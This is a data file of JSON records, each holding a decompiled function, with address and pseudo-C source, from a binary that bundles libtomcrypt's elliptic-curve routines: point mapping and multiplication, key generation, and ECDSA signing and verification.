{"Function Name": "FUN_0041b840", "Address": "0041b840", "Source Code": "int FUN_0041b840(undefined8 *inputArray,long modulus,long mp)\n{\n    int returnValue; \n    undefined8 intermediateValue1; \n    undefined8 intermediateValue2; \n    \n    if (inputArray == (undefined8 *)0x0) {\n        FUN_00410bc0(\"P != NULL\",\"libtomcrypt.c\",0x6184);\n    }\n    \n    if (modulus == 0) {\n        FUN_00410bc0(\"modulus != NULL\",\"libtomcrypt.c\",0x6185);\n    }\n    \n    if (mp == 0) {\n        FUN_00410bc0(\"mp != NULL\",\"libtomcrypt.c\",0x6186);\n    }\n    \n    \n    returnValue = FUN_0041ae70(&intermediateValue1,&intermediateValue2,0);\n    if (returnValue != 0) {\n        return 0xd; \n    }\n    \n    \n    returnValue = (*DAT_00669a30)(inputArray[2],modulus,mp);\n    if (returnValue == 0) {\n        \n        returnValue = (*DAT_00669a18)(inputArray[2],modulus,intermediateValue1);\n        if (returnValue == 0) {\n            \n            returnValue = (*DAT_006699d8)(intermediateValue1,intermediateValue2);\n            if (returnValue == 0) {\n                \n                returnValue = (*DAT_006699e0)(intermediateValue2,modulus,0,intermediateValue2);\n                if (returnValue == 0) {\n                    \n                    returnValue = (*DAT_006699c8)(intermediateValue1,intermediateValue2,intermediateValue1);\n                    if (returnValue == 0) {\n                        \n                        returnValue = (*DAT_006699e0)(intermediateValue1,modulus,0,intermediateValue1);\n                        if (returnValue == 0) {\n                            \n                            returnValue = (*DAT_006699c8)(*inputArray,intermediateValue2,*inputArray);\n                            if (returnValue == 0) {\n                                \n                                returnValue = (*DAT_00669a30)(*inputArray,modulus,mp);\n                                if (returnValue == 0) {\n                                    \n                                    returnValue = (*DAT_006699c8)(inputArray[1],intermediateValue1,inputArray[1]);\n                                    if (returnValue == 0) {\n                                        \n                                        returnValue = (*DAT_00669a30)(inputArray[1],modulus,mp);\n                                        if (returnValue == 0) {\n                                            \n                                            returnValue = (*DAT_00669938)(inputArray[2],1);\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n    \n    \n    FUN_0041aff0(intermediateValue1,intermediateValue2,0);\n    return returnValue; \n}"}
{"Function Name": "FUN_0041ba90", "Address": "0041ba90", "Source Code": "int FUN_0041ba90(undefined8 *param_1,long param_2,undefined8 *param_3,long param_4,\nundefined8 *param_5,long param_6)\n{\nbool bVar1;\nuint uVar2;\nuint uVar3;\nuint uVar4;\nint iVar5;\nuint uVar6;\nuint uVar7;\nbyte *__ptr;\nbyte *__ptr_00;\nundefined8 *puVar8;\nuint uVar9;\nlong lVar10;\nundefined8 **ppuVar11;\nint iVar12;\nint local_e0;\nuint local_d4;\nundefined8 local_c8;\nundefined8 local_c0;\nundefined8 *local_b8 [16];\nundefined8 *local_38;\nif (param_1 == (undefined8 *)0x0) {\nFUN_00410bc0(\"A != NULL\",\"libtomcrypt.c\",0x61f0);\n}\nif (param_3 == (undefined8 *)0x0) {\nFUN_00410bc0(\"B != NULL\",\"libtomcrypt.c\",0x61f1);\n}\nif (param_5 == (undefined8 *)0x0) {\nFUN_00410bc0(\"C != NULL\",\"libtomcrypt.c\",0x61f2);\n}\nif (param_2 == 0) {\nFUN_00410bc0(\"kA != NULL\",\"libtomcrypt.c\",0x61f3);\n}\nif (param_4 == 0) {\nFUN_00410bc0(\"kB != NULL\",\"libtomcrypt.c\",0x61f4);\n}\nif (param_6 == 0) {\nFUN_00410bc0(\"modulus != NULL\",\"libtomcrypt.c\",0x61f5);\n}\n__ptr = (byte *)calloc(1,0x100);\nif (__ptr == (byte *)0x0) {\nreturn 0xd;\n}\n__ptr_00 = (byte *)calloc(1,0x100);\nif (__ptr_00 == (byte *)0x0) {\nfree(__ptr);\nreturn 0xd;\n}\nuVar2 = (*DAT_00669990)(param_2);\nuVar3 = (*DAT_00669990)(param_4);\nif ((uVar3 < 0x101) && (uVar2 < 0x101)) {\nuVar4 = uVar2;\nif (uVar2 <= uVar3) {\nuVar4 = uVar3;\n}\nlVar10 = 0;\n(*DAT_00669998)(param_2,__ptr + (uVar4 - uVar2));\n(*DAT_00669998)(param_4,__ptr_00 + (uVar4 - uVar3));\ndo {\npuVar8 = (undefined8 *)FUN_0041af90();\nlocal_b8[lVar10] = puVar8;\nif (puVar8 == (undefined8 *)0x0) {\nif ((int)lVar10 != 0) {\nppuVar11 = local_b8;\ndo {\npuVar8 = *ppuVar11;\nppuVar11 = ppuVar11 + 1;\nFUN_0041ba50(puVar8);\n} while (ppuVar11 != local_b8 + (ulong)((int)lVar10 - 1) + 1);\n}\niVar5 = 0xd;\ngoto LAB_0041bb4b;\n}\nlVar10 = lVar10 + 1;\n} while (lVar10 != 0x10);\niVar5 = (*DAT_00669a20)(param_6,&local_c8);\nif (iVar5 == 0) {\niVar5 = (*DAT_00669910)(&local_c0);\nif (iVar5 == 0) {\niVar5 = (*DAT_00669a28)(local_c0,param_6);\nif ((((((iVar5 == 0) &&\n(iVar5 = (*DAT_00669a08)(*param_1,local_c0,param_6,*local_b8[1]), iVar5 == 0)) &&\n(iVar5 = (*DAT_00669a08)(param_1[1],local_c0,param_6,local_b8[1][1]), iVar5 == 0)) &&\n(((iVar5 = (*DAT_00669a08)(param_1[2],local_c0,param_6,local_b8[1][2]), iVar5 == 0 &&\n(iVar5 = (*DAT_00669a08)(*param_3,local_c0,param_6,*local_b8[4]), iVar5 == 0)) &&\n((iVar5 = (*DAT_00669a08)(param_3[1],local_c0,param_6,local_b8[4][1]), iVar5 == 0 &&\n((iVar5 = (*DAT_00669a08)(param_3[2],local_c0,param_6,local_b8[4][2]), iVar5 == 0 &&\n(iVar5 = (*DAT_00669a60)(local_b8[1],local_b8[2],param_6,local_c8), iVar5 == 0))))))\n)) && (iVar5 = (*DAT_00669a58)(local_b8[1],local_b8[2],local_b8[3],param_6,local_c8),\niVar5 == 0)) &&\n(iVar5 = (*DAT_00669a60)(local_b8[4],local_b8[8],param_6,local_c8), iVar5 == 0)) {\nlVar10 = 0;\niVar5 = (*DAT_00669a58)(local_b8[4],local_b8[8],local_b8[0xc],param_6,local_c8);\nif (iVar5 == 0) {\ndo {\niVar12 = 1;\ndo {\niVar5 = (*DAT_00669a58)(local_b8[lVar10 + 1],local_b8[(uint)(iVar12 * 4)],\nlocal_b8[(uint)(iVar12 * 4 + (int)lVar10 + 1)],param_6,\nlocal_c8);\nif (iVar5 != 0) goto LAB_0041bd58;\niVar12 = iVar12 + 1;\n} while (iVar12 != 4);\nlVar10 = lVar10 + 1;\n} while (lVar10 != 3);\nuVar3 = (uint)*__ptr;\nbVar1 = true;\nlocal_e0 = 3;\nlocal_d4 = 0xffffffff;\nuVar2 = (uint)*__ptr_00;\nLAB_0041bf3e:\ndo {\nlocal_e0 = local_e0 + 1;\nif (local_e0 == 4) {\nlocal_d4 = local_d4 + 1;\nif (local_d4 == uVar4) {\niVar5 = FUN_0041b840(param_5,param_6,local_c8);\nbreak;\n}\nlocal_e0 = 0;\nuVar3 = (uint)__ptr[local_d4];\nuVar2 = (uint)__ptr_00[local_d4];\n}\nuVar6 = uVar3 >> 6;\nuVar9 = uVar2 >> 6;\nuVar7 = (uVar3 | uVar2) >> 6;\nuVar3 = (uVar3 & 0x3f) << 2;\nuVar2 = (uVar2 & 0x3f) << 2;\nif (uVar7 == 0) {\nif ((bVar1) || (bVar1)) goto LAB_0041bf3e;\nLAB_0041bf85:\niVar5 = (*DAT_00669a60)(param_5,param_5,param_6,local_c8);\nif ((iVar5 != 0) ||\n(iVar5 = (*DAT_00669a60)(param_5,param_5,param_6,local_c8), iVar5 != 0)) break;\nif (uVar7 == 0) {\nbVar1 = false;\ngoto LAB_0041bf3e;\n}\n}\nelse {\nif (!bVar1) goto LAB_0041bf85;\nif (bVar1) {\npuVar8 = local_b8[uVar6 + uVar9 * 4];\niVar5 = (*DAT_00669930)(*puVar8,*param_5);\nif (((iVar5 != 0) || (iVar5 = (*DAT_00669930)(puVar8[1],param_5[1]), iVar5 != 0))\n|| (iVar5 = (*DAT_00669930)(puVar8[2],param_5[2]), iVar5 != 0)) break;\nbVar1 = false;\ngoto LAB_0041bf3e;\n}\n}\niVar5 = (*DAT_00669a58)(param_5,local_b8[uVar6 + uVar9 * 4],param_5,param_6,local_c8);\n} while (iVar5 == 0);\n}\n}\nLAB_0041bd58:\n(*DAT_00669920)(local_c0);\n}\n(*DAT_00669a38)(local_c8);\n}\nppuVar11 = local_b8;\ndo {\npuVar8 = *ppuVar11;\nppuVar11 = ppuVar11 + 1;\nFUN_0041ba50(puVar8);\n} while (ppuVar11 != &local_38);\n}\nelse {\niVar5 = 0x10;\n}\nLAB_0041bb4b:\nfree(__ptr);\nfree(__ptr_00);\nreturn iVar5;\n}\nLocal Variable: local_38 : undefined1\nLocal Variable: local_58 : undefined8\nLocal Variable: local_78 : undefined8\nLocal Variable: local_98 : undefined8\nLocal Variable: local_a0 : undefined8\nLocal Variable: local_a8 : undefined8\nLocal Variable: local_b0 : undefined8\nLocal Variable: local_b8 : undefined8\nLocal Variable: local_c0 : undefined8\nLocal Variable: local_c8 : undefined8\nLocal Variable: local_cc : undefined4\nLocal Variable: local_d0 : undefined4\nLocal Variable: local_d4 : undefined4\nLocal Variable: local_d8 : undefined4\nLocal Variable: local_e0 : undefined8\nLocal Variable: local_e8 : undefined8\nLocal Variable: local_f0 : undefined8\nLocal Variable: local_f8 : undefined8"}
{"Function Name": "FUN_0041c0b0", "Address": "0041c0b0", "Source Code": "ulong FUN_0041c0b0(long param_1,undefined8 *param_2,undefined8 *param_3,long param_4,int param_5)\n{\nundefined8 *puVar1;\nbool bVar2;\nuint uVar3;\nint iVar4;\nuint uVar5;\nulong uVar6;\nlong lVar7;\nundefined8 *puVar8;\nulong uVar9;\nuint uVar10;\nuint uVar11;\nlong *plVar12;\nint iVar13;\nlong lVar14;\nuint local_b0;\nulong local_a0;\nint local_94;\nint local_90;\nlong local_88;\nundefined8 local_80;\nlong local_78 [8];\nlong local_38;\nif (param_1 == 0) {\nFUN_00410bc0(\"k != NULL\",\"libtomcrypt.c\",0x62e0);\n}\nif (param_2 == (undefined8 *)0x0) {\nFUN_00410bc0(\"G != NULL\",\"libtomcrypt.c\",0x62e1);\n}\nif (param_3 == (undefined8 *)0x0) {\nFUN_00410bc0(\"R != NULL\",\"libtomcrypt.c\",0x62e2);\n}\nif (param_4 == 0) {\nFUN_00410bc0(\"modulus != NULL\",\"libtomcrypt.c\",0x62e3);\n}\nuVar6 = (*DAT_00669a20)(param_4,&local_80);\nif ((int)uVar6 != 0) {\nreturn uVar6;\n}\nuVar3 = (*DAT_00669910)(&local_88);\nif (uVar3 != 0) {\n(*DAT_00669a38)(local_80);\nreturn (ulong)uVar3;\n}\nlVar14 = 0;\nuVar3 = (*DAT_00669a28)(local_88,param_4);\nif (uVar3 != 0) {\n(*DAT_00669a38)(local_80);\n(*DAT_00669920)(local_88);\nreturn (ulong)uVar3;\n}\ndo {\nlVar7 = FUN_0041af90();\nlocal_78[lVar14] = lVar7;\nif (lVar7 == 0) {\nlVar7 = 0;\nif ((int)lVar14 != 0) {\ndo {\nplVar12 = local_78 + lVar7;\nlVar7 = lVar7 + 1;\nFUN_0041ba50(*plVar12);\n} while ((int)lVar7 < (int)lVar14);\n}\n(*DAT_00669a38)(local_80);\n(*DAT_00669920)(local_88);\nreturn 0xd;\n}\nlVar14 = lVar14 + 1;\n} while (lVar14 != 8);\npuVar8 = (undefined8 *)FUN_0041af90();\nif (puVar8 == (undefined8 *)0x0) {\nlocal_b0 = 0xd;\nlVar14 = local_78[0];\n}\nelse {\niVar4 = (*DAT_00669960)(local_88,1);\nif (iVar4 == 0) {\nlocal_b0 = (*DAT_00669930)(*param_2,*puVar8);\nlVar14 = local_78[0];\nif ((local_b0 != 0) ||\n(local_b0 = (*DAT_00669930)(param_2[1],puVar8[1]), lVar14 = local_78[0], local_b0 != 0))\ngoto LAB_0041c4a6;\nlocal_b0 = (*DAT_00669930)(param_2[2],puVar8[2]);\n}\nelse {\nlocal_b0 = (*DAT_00669a08)(*param_2,local_88,param_4,*puVar8);\nlVar14 = local_78[0];\nif ((local_b0 != 0) ||\n(local_b0 = (*DAT_00669a08)(param_2[1],local_88,param_4,puVar8[1]), lVar14 = local_78[0],\nlocal_b0 != 0)) goto LAB_0041c4a6;\nlocal_b0 = (*DAT_00669a08)(param_2[2],local_88,param_4,puVar8[2]);\n}\nlVar14 = local_78[0];\nif (local_b0 == 0) {\n(*DAT_00669920)(local_88);\nlocal_88 = 0;\nlocal_b0 = (*DAT_00669a60)(puVar8,local_78[0],param_4,local_80);\nlVar14 = local_78[0];\nif (((local_b0 == 0) &&\n(local_b0 = (*DAT_00669a60)(local_78[0],local_78[0],param_4,local_80), local_b0 == 0)) &&\n(local_b0 = (*DAT_00669a60)(local_78[0],local_78[0],param_4,local_80), local_b0 == 0)) {\nplVar12 = local_78 + 1;\ndo {\nuVar3 = (*DAT_00669a58)(plVar12[-1],puVar8,*plVar12,param_4,local_80);\nlocal_b0 = uVar3;\nif (uVar3 != 0) goto LAB_0041c4a6;\nplVar12 = plVar12 + 1;\n} while (plVar12 != &local_38);\nlocal_90 = (*DAT_00669950)(param_1);\nlocal_90 = local_90 + -1;\nuVar10 = 0;\nlocal_94 = 1;\nuVar11 = 0;\nbVar2 = true;\nlocal_a0 = 0;\niVar4 = 0;\nwhile( true ) {\nwhile( true ) {\nwhile( true ) {\nlocal_94 = local_94 + -1;\nif (local_94 == 0) {\nif (local_90 == -1) {\nif ((iVar4 < 1) || (uVar10 != 2)) goto LAB_0041c684;\niVar13 = 0;\ngoto LAB_0041c6ef;\n}\nlocal_a0 = (*DAT_00669948)(param_1);\nlocal_90 = local_90 + -1;\nlocal_94 = DAT_00669908;\n}\nuVar6 = local_a0 << 1;\nuVar9 = local_a0 >> ((char)DAT_00669908 - 1U & 0x3f);\nuVar5 = (uint)uVar9 & 1;\nlocal_a0 = uVar6;\nif ((uVar5 | uVar10) != 0) break;\nuVar10 = 0;\n}\nif (((uVar9 & 1) == 0) && (uVar10 == 1)) break;\nuVar11 = uVar11 | uVar5 << (3U - (char)iVar4 & 0x1f);\nif (iVar4 + 1 == 4) {\niVar4 = 4;\nif (bVar2) {\npuVar1 = (undefined8 *)local_78[(int)(uVar11 - 8)];\nlocal_b0 = (*DAT_00669930)(*puVar1,*param_3);\nif (((local_b0 != 0) ||\n(local_b0 = (*DAT_00669930)(puVar1[1],param_3[1]), local_b0 != 0)) ||\n(local_b0 = (*DAT_00669930)(puVar1[2],param_3[2]), local_b0 != 0))\ngoto LAB_0041c4a6;\nuVar10 = 1;\niVar4 = 0;\nuVar11 = 0;\nbVar2 = false;\n}\nelse {\ndo {\nlocal_b0 = (*DAT_00669a60)(param_3,param_3,param_4,local_80);\nif (local_b0 != 0) goto LAB_0041c4a6;\niVar4 = iVar4 + -1;\n} while (iVar4 != 0);\nlocal_b0 = (*DAT_00669a58)(param_3,local_78[(int)(uVar11 - 8)],param_3,param_4,\nlocal_80);\nif (local_b0 != 0) goto LAB_0041c4a6;\nuVar10 = 1;\niVar4 = 0;\nuVar11 = 0;\n}\n}\nelse {\nuVar10 = 2;\niVar4 = iVar4 + 1;\n}\n}\nlocal_b0 = (*DAT_00669a60)(param_3,param_3,param_4,local_80);\nif (local_b0 != 0) break;\nuVar10 = 1;\n}\n}\n}\n}\ngoto LAB_0041c4a6;\nLAB_0041c6ef:\ndo {\nif (bVar2) {\nif ((uVar11 * 2 & 0x10) != 0) {\nif (!bVar2) goto LAB_0041c6c9;\nlocal_b0 = (*DAT_00669930)(*puVar8,*param_3);\nif (((local_b0 != 0) || (local_b0 = (*DAT_00669930)(puVar8[1],param_3[1]), local_b0 != 0))\n|| (local_b0 = (*DAT_00669930)(puVar8[2],param_3[2]), local_b0 != 0)) goto LAB_0041c4a6;\nbVar2 = false;\n}\n}\nelse {\nlocal_b0 = (*DAT_00669a60)(param_3,param_3,param_4,local_80);\nif (local_b0 != 0) goto LAB_0041c4a6;\nif ((uVar11 * 2 & 0x10) != 0) {\nLAB_0041c6c9:\nlocal_b0 = (*DAT_00669a58)(param_3,puVar8,param_3,param_4,local_80);\nif (local_b0 != 0) goto LAB_0041c4a6;\n}\n}\nuVar11 = uVar11 * 2;\niVar13 = iVar13 + 1;\n} while (iVar13 < iVar4);\nLAB_0041c684:\nlocal_b0 = uVar3;\nif (param_5 != 0) {\nlocal_b0 = FUN_0041b840(param_3,param_4,local_80);\n}\nLAB_0041c4a6:\nif (local_88 != 0) {\n(*DAT_00669920)();\n}\nplVar12 = local_78;\n(*DAT_00669a38)(local_80);\nFUN_0041ba50(puVar8);\nwhile( true ) {\nplVar12 = plVar12 + 1;\nFUN_0041ba50(lVar14);\nif (plVar12 == &local_38) break;\nlVar14 = *plVar12;\n}\nreturn (ulong)local_b0;\n}\nLocal Variable: local_38 : undefined1\nLocal Variable: local_70 : undefined8\nLocal Variable: local_78 : undefined8\nLocal Variable: local_80 : undefined8\nLocal Variable: local_88 : undefined8\nLocal Variable: local_8c : undefined4\nLocal Variable: local_90 : undefined4\nLocal Variable: local_94 : undefined4\nLocal Variable: local_98 : undefined4\nLocal Variable: local_a0 : undefined8\nLocal Variable: local_a8 : undefined8\nLocal Variable: local_b0 : undefined8\nLocal Variable: local_b8 : undefined8"}
{"Function Name": "FUN_0041c770", "Address": "0041c770", "Source Code": "int FUN_0041c770(undefined8 input_param, uint index, undefined4 *key_array, int *data_pointer)\n{\n    int return_status; \n    void *allocated_memory; \n    long function_result; \n    undefined8 *pointer_result; \n    long data_value; \n    undefined8 temp_storage; \n    undefined8 temp_array[2]; \n    \n    if (key_array == (undefined4 *)0x0) {\n        FUN_00410bc0(\"key != NULL\", \"libtomcrypt.c\", 0x5d11);\n    }\n    \n    if (DAT_00669900 == 0) {\n        FUN_00410bc0(\"ltc_mp.name != NULL\", \"libtomcrypt.c\", 0x5d12);\n    }\n    \n    if (data_pointer == (int *)0x0) {\n        FUN_00410bc0(\"dp != NULL\", \"libtomcrypt.c\", 0x5d13);\n    }\n    \n    if (0xff < index) {\n        return 0xc;\n    }\n    \n    if ((&DAT_006495c0)[(long)(int)index * 10] == 0) {\n        return 0xc;\n    }\n    \n    key_array[1] = 0xffffffff;\n    \n    *(int **)(key_array + 2) = data_pointer;\n    \n    data_value = (long)*data_pointer;\n    \n    allocated_memory = malloc(0x42);\n    \n    if (allocated_memory == (void *)0x0) {\n        return 0xd; \n    }\n    \n    function_result = (*(code *)(&DAT_006495e8)[(long)(int)index * 10])(allocated_memory, data_value, input_param);\n    return_status = 9; \n    \n    if (data_value != function_result) goto LAB_0041c809;\n    \n    return_status = FUN_0041ae70(key_array + 4, key_array + 6, key_array + 8, key_array + 10, &temp_storage, temp_array, 0);\n    \n    if (return_status != 0) goto LAB_0041c809;\n    \n    pointer_result = (undefined8 *)FUN_0041af90();\n    \n    if (pointer_result == (undefined8 *)0x0) {\n        return_status = 0xd; \n        goto LAB_0041c905; \n    } else {\n        \n        return_status = (*DAT_00669980)(temp_storage, *(undefined8 *)(*(long *)(key_array + 2) + 0x10), 0x10);\n        if ((((((return_status != 0) ||\n            (return_status = (*DAT_00669980)(temp_array[0], *(undefined8 *)(*(long *)(key_array + 2) + 0x20), 0x10), return_status != 0)) ||\n            (return_status = (*DAT_00669980)(*pointer_result, *(undefined8 *)(*(long *)(key_array + 2) + 0x28), 0x10), return_status != 0)) ||\n            ((return_status = (*DAT_00669980)(pointer_result[1], *(undefined8 *)(*(long *)(key_array + 2) + 0x30), 0x10), return_status != 0 ||\n            (return_status = (*DAT_00669938)(pointer_result[2], 1), return_status != 0)))) ||\n            (return_status = (*DAT_006699a0)(*(undefined8 *)(key_array + 10), allocated_memory, data_value), return_status != 0 ||\n            ((return_status = (*DAT_00669958)(*(undefined8 *)(key_array + 10), temp_array[0]), return_status != -1 &&\n            (return_status = (*DAT_006699e0)(*(undefined8 *)(key_array + 10), temp_array[0], 0, *(undefined8 *)(key_array + 10)), return_status != 0)))))) ||\n            (return_status = (*DAT_00669a50)(*(undefined8 *)(key_array + 10), pointer_result, key_array + 4, temp_storage, 1), return_status != 0)) goto LAB_0041c905;\n        \n        *key_array = 1;\n    }\n    \n    FUN_0041ba50(pointer_result);\n    \n    FUN_0041aff0(temp_storage, temp_array[0], 0);\nLAB_0041c809:\n    \n    free(allocated_memory);\n    return return_status; \n}"}
{"Function Name": "FUN_0041cab0", "Address": "0041cab0", "Source Code": "ulong FUN_0041cab0(long input_ptr, int input_length, long output_ptr, long output_length, undefined8 callback_function,\nuint key_length, int *key_array)\n{\n    int current_element; \n    uint status_code; \n    ulong return_value; \n    int *data_pointer; \n    int element_count; \n    undefined8 intermediate_storage_1; \n    undefined8 intermediate_storage_2; \n    undefined8 intermediate_storage_3; \n    undefined8 intermediate_storage_4; \n    undefined temp_buffer [16]; \n    \n    if (input_ptr == 0) {\n        FUN_00410bc0(\"in != NULL\", \"libtomcrypt.c\", 0x5df9);\n    }\n    \n    if (output_ptr == 0) {\n        FUN_00410bc0(\"out != NULL\", \"libtomcrypt.c\", 0x5dfa);\n    }\n    \n    if (output_length == 0) {\n        FUN_00410bc0(\"outlen != NULL\", \"libtomcrypt.c\", 0x5dfb);\n    }\n    \n    if (key_array == (int *)0x0) {\n        FUN_00410bc0(\"key != NULL\", \"libtomcrypt.c\", 0x5dfc);\n    }\n    \n    return_value = 0xf; \n    \n    if (*key_array == 1) {\n        element_count = 0; \n        data_pointer = &DAT_0043de58; \n        \n        do {\n            current_element = *data_pointer; \n            element_count = element_count + 1; \n            data_pointer = data_pointer + 0xe; \n        } while (current_element != 0); \n        \n        \n        if ((key_array[1] < element_count) && (-2 < key_array[1])) {\n            return_value = 0xc; \n            \n            if ((key_length < 0x100) && ((&DAT_006495c0)[(long)(int)key_length * 10] != 0)) {\n                \n                return_value = FUN_0041ae70(&intermediate_storage_1, &intermediate_storage_2, &intermediate_storage_3, &intermediate_storage_4, 0);\n                \n                if ((int)return_value == 0) {\n                    \n                    status_code = (*DAT_00669980)(intermediate_storage_3, *(undefined8 *)(*(long *)(key_array + 2) + 0x20), 0x10);\n                    \n                    if (status_code == 0) {\n                        \n                        status_code = (*DAT_006699a0)(intermediate_storage_4, input_ptr, (long)input_length);\n                        \n                        if (status_code == 0) {\nLAB_0041cccc: \n                            do {\n                                \n                                status_code = FUN_0041c770(callback_function, key_length, temp_buffer, *(undefined8 *)(key_array + 2));\n                                \n                                if (status_code != 0) goto LAB_0041cbca; \n                                \n                                status_code = (*DAT_006699e0)(intermediate_storage_2, intermediate_storage_3, 0, intermediate_storage_1);\n                                \n                                if (status_code != 0) {\nLAB_0041ce57: \n                                    FUN_0041b230(temp_buffer); \n                                    goto LAB_0041cbca; \n                                }\n                                \n                                element_count = (*DAT_00669960)(intermediate_storage_1, 0);\n                                \n                                if (element_count == 0) {\n                                    FUN_0041b230(temp_buffer); \n                                    goto LAB_0041cccc; \n                                }\n                                \n                                status_code = (*DAT_00669a18)(intermediate_storage_3, intermediate_storage_3, intermediate_storage_3);\n                                \n                                if (status_code != 0) goto LAB_0041ce57; \n                                \n                                status_code = (*DAT_00669a08)(*(undefined8 *)(key_array + 10), intermediate_storage_1, intermediate_storage_3, intermediate_storage_2);\n                                \n                                if (status_code != 0) goto LAB_0041ce57; \n                                \n                                status_code = (*DAT_006699a8)(intermediate_storage_4, intermediate_storage_2, intermediate_storage_2);\n                                \n                                if (status_code != 0) goto LAB_0041ce57; \n                                \n                                status_code = (*DAT_006699e0)(intermediate_storage_2, intermediate_storage_3, 0, intermediate_storage_2);\n                                \n                                if (status_code != 0) goto LAB_0041ce57; \n                                \n                                status_code = (*DAT_00669a08)(intermediate_storage_2, intermediate_storage_3, intermediate_storage_3, intermediate_storage_2);\n                                \n                                if (status_code != 0) goto LAB_0041ce57; \n                                FUN_0041b230(temp_buffer); \n                                \n                                element_count = (*DAT_00669960)(intermediate_storage_2, 0);\n                            } while (element_count == 0); \n                            \n                            status_code = FUN_00419720(output_ptr, output_length, 2, 1, intermediate_storage_1, 2, 1, intermediate_storage_2, 0, 0, 0);\n                        }\n                    }\n                }\n            }\n        } else {\n            return_value = 0x12; \n        }\n    }\nLAB_0041cbca: \n    FUN_0041aff0(intermediate_storage_1, intermediate_storage_2, intermediate_storage_3, intermediate_storage_4, 0); \n    return return_value; \n}"}
{"Function Name": "FUN_0041d090", "Address": "0041d090", "Source Code": "int FUN_0041d090(long param_1,undefined8 param_2,long param_3,int param_4,undefined4 *param_5,\nlong param_6)\n{\nint iVar1;\nint *piVar2;\nundefined8 *puVar3;\nundefined8 *puVar4;\nint iVar5;\nundefined8 *puVar6;\nundefined8 local_88;\nundefined8 local_80;\nundefined8 local_78;\nundefined8 local_70;\nundefined8 local_68;\nundefined8 local_60;\nundefined8 local_58;\nundefined8 local_50;\nundefined8 local_48;\nlong local_40 [2];\nif (param_1 == 0) {\nFUN_00410bc0(\"sig != NULL\",\"libtomcrypt.c\",0x5f22);\n}\nif (param_3 == 0) {\nFUN_00410bc0(\"hash != NULL\",\"libtomcrypt.c\",0x5f23);\n}\nif (param_5 == (undefined4 *)0x0) {\nFUN_00410bc0(\"stat != NULL\",\"libtomcrypt.c\",0x5f24);\n}\nif (param_6 == 0) {\nFUN_00410bc0(\"key != NULL\",\"libtomcrypt.c\",0x5f25);\n}\n*param_5 = 0;\nlocal_40[0] = 0;\niVar5 = 0;\npiVar2 = &DAT_0043de58;\ndo {\niVar1 = *piVar2;\niVar5 = iVar5 + 1;\npiVar2 = piVar2 + 0xe;\n} while (iVar1 != 0);\nif ((iVar5 <= *(int *)(param_6 + 4)) || (*(int *)(param_6 + 4) < -1)) {\nreturn 0x12;\n}\npuVar6 = &local_48;\niVar5 = FUN_0041ae70(&local_88,&local_80,&local_78,&local_70,&local_68,&local_60,&local_50,\n&local_58,puVar6,0);\nif (iVar5 != 0) {\nreturn 0xd;\n}\npuVar3 = (undefined8 *)FUN_0041af90();\npuVar4 = (undefined8 *)FUN_0041af90();\nif ((puVar3 == (undefined8 *)0x0) || (puVar4 == (undefined8 *)0x0)) {\niVar5 = 0xd;\n}\nelse {\niVar5 = FUN_00418e50(param_1,param_2,2,1,local_88,2,1,local_80,\n(ulong)puVar6 & 0xffffffff00000000,0,0);\nif (((iVar5 == 0) &&\n(iVar5 = (*DAT_00669980)(local_50,*(undefined8 *)(*(long *)(param_6 + 8) + 0x20),0x10),\niVar5 == 0)) &&\n(iVar5 = (*DAT_00669980)(local_48,*(undefined8 *)(*(long *)(param_6 + 8) + 0x10),0x10),\niVar5 == 0)) {\niVar5 = (*DAT_00669960)(local_88,0);\nif (((iVar5 == 0) || (iVar5 = (*DAT_00669960)(local_80,0), iVar5 == 0)) ||\n((iVar5 = (*DAT_00669958)(local_88,local_50), iVar5 != -1 ||\n(iVar5 = (*DAT_00669958)(local_80,local_50), iVar5 != -1)))) {\niVar5 = 7;\n}\nelse {\niVar5 = (*DAT_006699a0)(local_58,param_3,(long)param_4);\nif (((iVar5 == 0) && (iVar5 = (*DAT_00669a18)(local_80,local_50,local_70), iVar5 == 0)) &&\n((((iVar5 = (*DAT_00669a08)(local_58,local_70,local_50,local_68), iVar5 == 0 &&\n(((iVar5 = (*DAT_00669a08)(local_88,local_70,local_50,local_60), iVar5 == 0 &&\n(iVar5 = (*DAT_00669980)(*puVar3,*(undefined8 *)(*(long *)(param_6 + 8) + 0x28),0x10\n), iVar5 == 0)) &&\n(iVar5 = (*DAT_00669980)(puVar3[1],*(undefined8 *)(*(long *)(param_6 + 8) + 0x30),\n0x10), iVar5 == 0)))) &&\n(((iVar5 = (*DAT_00669938)(puVar3[2],1), iVar5 == 0 &&\n(iVar5 = (*DAT_00669930)(*(undefined8 *)(param_6 + 0x10),*puVar4), iVar5 == 0)) &&\n(iVar5 = (*DAT_00669930)(*(undefined8 *)(param_6 + 0x18),puVar4[1]), iVar5 == 0)))) &&\n(iVar5 = (*DAT_00669930)(*(undefined8 *)(param_6 + 0x20),puVar4[2]), iVar5 == 0)))) {\nif (DAT_00669a70 == (code *)0x0) {\niVar5 = (*DAT_00669a50)(local_68,puVar3,puVar3,local_48,0);\nif (((iVar5 != 0) ||\n(iVar5 = (*DAT_00669a50)(local_60,puVar4,puVar4,local_48,0), iVar5 != 0)) ||\n((iVar5 = (*DAT_00669a20)(local_48,local_40), iVar5 != 0 ||\n(iVar5 = (*DAT_00669a58)(puVar4,puVar3,puVar3,local_48,local_40[0]), iVar5 != 0))))\ngoto LAB_0041d1af;\niVar5 = (*DAT_00669a68)(puVar3,local_48,local_40[0]);\n}\nelse {\niVar5 = (*DAT_00669a70)(puVar3,local_68,puVar4,local_60,puVar3,local_48);\n}\nif (((iVar5 == 0) && (iVar5 = (*DAT_006699e0)(*puVar3,local_50,0,local_78), iVar5 == 0))\n&& (iVar1 = (*DAT_00669958)(local_78,local_88), iVar1 == 0)) {\n*param_5 = 1;\n}\n}\n}\n}\n}\nLAB_0041d1af:\nFUN_0041ba50(puVar3);\nFUN_0041ba50(puVar4);\nFUN_0041aff0(local_88,local_80,local_78,local_70,local_68,local_60,local_50,local_58,local_48,0);\nif (local_40[0] != 0) {\n(*DAT_00669a38)();\n}\nreturn iVar5;\n}\nLocal Variable: local_40 : undefined8\nLocal Variable: local_48 : undefined8\nLocal Variable: local_50 : undefined8\nLocal Variable: local_58 : undefined8\nLocal Variable: local_60 : undefined8\nLocal Variable: local_68 : undefined8\nLocal Variable: local_70 : undefined8\nLocal Variable: local_78 : undefined8\nLocal Variable: local_80 : undefined8\nLocal Variable: local_88 : undefined8\nLocal Variable: local_90 : undefined8\nLocal Variable: local_98 : undefined8\nLocal Variable: local_a8 : undefined8\nLocal Variable: local_b0 